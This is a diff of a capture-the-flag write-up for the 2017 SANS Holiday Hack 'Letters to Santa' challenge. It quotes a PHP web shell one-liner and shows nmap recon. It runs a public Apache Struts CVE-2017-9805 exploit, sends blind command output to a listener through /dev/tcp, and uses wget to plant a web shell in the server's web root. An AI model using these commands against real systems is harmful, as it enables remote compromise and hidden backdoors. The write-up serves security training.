@@ -18,27 +18,26 @@
    :CUSTOM_ID: background-information
    :END:
 
-The IP address of =l2s.northpolechristmastown.com= is =35.185.84.51=. Visiting in
-reveals a simple web page for sending a very basic letter to Santa. If we look at
-the ssl certificate for the host we can see it's actually a certificate for
-=dev.northpolechristmastown.com=.
+We know that there is an application on =https://l2s.northpolechristmastown.com= that we need to investigate.
+This webpage is publically accessible from the Internet and not appear to require any special measures to
+access it. We do not know Alabaster password or username at the start of this challenge nor what type of
+web service is running on the host.
 
-#+BEGIN_SRC sh
+The following hints were provided by Sparkle Redberry from completing the level
+[[https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7][Winconceivable: The Cliffs of Winsanity]]:
+  1. We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
+  2. Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
+  3. Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
+  4. A simple web shell is to create a PHP file in the web root with ~<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>~. Then, I visit the URL with my commands. For example, =http://server/complexFileName.php?e=ls=.
+  5. There are lots of different web shell tools available. [[https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985][You can get a simple PHP web shell that is easy to use here]].
+  6. That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
+  7. Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. [[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code][Here is a useful article]].
+  8. Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.
 
-#+END_SRC
-
-Hints:
-
-List any useful hints here.
-
-Blog Posts:
-
-- Why You Need the Skills to Tinker with Publicly Released Exploit Code
-  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
-- A Spot of Tee
-  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
+The following SANS Pentest Blog posts were also very helpful for this challenge:
+- [[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code][Why You Need the Skills to Tinker with Publicly Released Exploit Code]]
+  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and CVE-2017-9805 Code: [[https://github.com/chrisjd20/cve-2017-9805.py]]
+- [[https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted][A Spot of Tee]]
   bash shell, and bypassing the I/O restriction with tee
 
 ** Goal
@@ -46,15 +45,168 @@ Blog Posts:
    :CUSTOM_ID: goal
    :END:
 
-What are we trying to accomplish?
+There are two goals for this challenge. The first is to determine the topic of
+the Great Book Page that is sitting on the web root of this server. The second
+is to determine what Alabaster's password is.
 
 ** Approach
    :PROPERTIES:
    :CUSTOM_ID: approach
    :END:
 
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+According to the second hint there might be development code left in the production code.
+If we look at the source of =l2s= the following code pops out.
+
+#+BEGIN_SRC html
+    <!-- Development version -->
+    <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
+#+END_SRC
+
+Let's do some recon on the hosts:
+
+#+BEGIN_SRC sh
+nmap -sC l2s.northpolechristmastown.com
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
+Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
+Host is up (0.027s latency).
+rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+| ssh-hostkey:
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open   http
+|_http-title: Did not follow redirect to https://l2s.northpolechristmastown.com/
+443/tcp  open   https
+|_http-title: Toys List
+| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
+| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
+| Not valid before: 2017-11-29T12:54:54
+|_Not valid after:  2018-02-27T12:54:54
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg:
+|_  http/1.1
+3389/tcp closed ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
+#+END_SRC
+
+There appears to be another name on the certificate of the host. Let's let nmap's scripts scan that as well.
+
+#+BEGIN_SRC sh
+nmap -sC dev.northpolechristmastown.com
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
+Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
+Host is up (0.028s latency).
+rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+| ssh-hostkey:
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open   http
+|_http-title: Did not follow redirect to https://dev.northpolechristmastown.com/
+443/tcp  open   https
+| http-title: Toys List
+|_Requested resource was /orders.xhtml
+| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
+| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
+| Not valid before: 2017-11-29T12:54:54
+|_Not valid after:  2018-02-27T12:54:54
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg:
+|_  http/1.1
+3389/tcp closed ms-wbt-server
+#+END_SRC
+
+We can see that dev and l2s are one in the same. Visiting the dev page has a footer
+that simply states =Powered By: Apache Struts=. Let's use this to our advantage.
+Let's use the tool provided through the SANS Pentest blog,
+[[https://github.com/chrisjd20/cve-2017-9805.py][cve-2017-9805.py]]. The dev page
+we land on is [[https://dev.northpolechristmastown.com/orders.xhtml]] so we'll use
+that to start from.
+
+#+BEGIN_SRC sh
+python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
+[+] Encoding Command
+[+] Building XML object
+[+] Placing command in XML object
+[+] Converting Back to String
+[+] Making Post Request with our payload
+[+] Payload executed
+#+END_SRC
+
+Looks like we need to modify the program to let us see what it's
+doing by uncommenting the following line:
+
+#+BEGIN_SRC sh
+print request.text
+#+END_SRC
+
+Performing the same simple command above results in a lengthy Apache Tomcat
+error with no apparent output from our =ls= command. We're dealing with a
+blind injection so we'll need to figure out a different way to get the output
+of the command. One trick we can pull is redirecting output to a special
+pseudo device, =/dev/tcp/$host/$port=. First we'll need to set up a listener
+on our end first.
+
+#+BEGIN_SRC sh
+holiday@hack:~$ nc -l -p 8888
+#+END_SRC
+
+Now we run the exploit again:
+
+#+BEGIN_SRC sh
+./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls > /dev/tcp/1.2.3.4/1234"
+#+END_SRC
+
+The result on our end is:
+#+BEGIN_SRC sh
+holiday@hack:~$ nc -l -p 8888
+bin
+boot
+dev
+etc
+home
+...
+vmlinuz
+vmlinuz.old
+#+END_SRC
+
+It looks like we've been dropped into the root directory. Let's look for
+where the web root is. Normally, the default is /var/www/html on most
+linux+apache based hosts. We'll try again with the command =ls -al /var/ww/html=.
+
+#+BEGIN_SRC sh
+total 1772
+drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
+drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
+drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
+-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
+-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
+-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
+#+END_SRC
+
+Oh look. There's [[https://l2s.northpolechristmastown.com/GreatBookPage2.pdf][GreatBookPage2.pdf]]. We can download it and find the answer to the first question. Now on to the second.
+
+It looks like we found our web root. Let's try out the
+web shell they suggest in the hints from Josh Wright
+[[https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php][easy-simple-php-webshell.php]].
+We'll output it to a random file in the web root then
+we can try to use it to execute commands using a browser.
+
+#+BEGIN_SRC sh
+./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php" -u https://dev.northpolechristmastown.com/orders.xhtml
+#+END_SRC
+
+Now we can access [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]] and look around. If we do an =ls= in this webshell, it just returns the local directory, =/var/www/html=. Nothing in here suggests that we have the webroot for the dev server, [[https://dev.northpolechristmastown.com]]. 
 
 ** Solution
    :PROPERTIES:
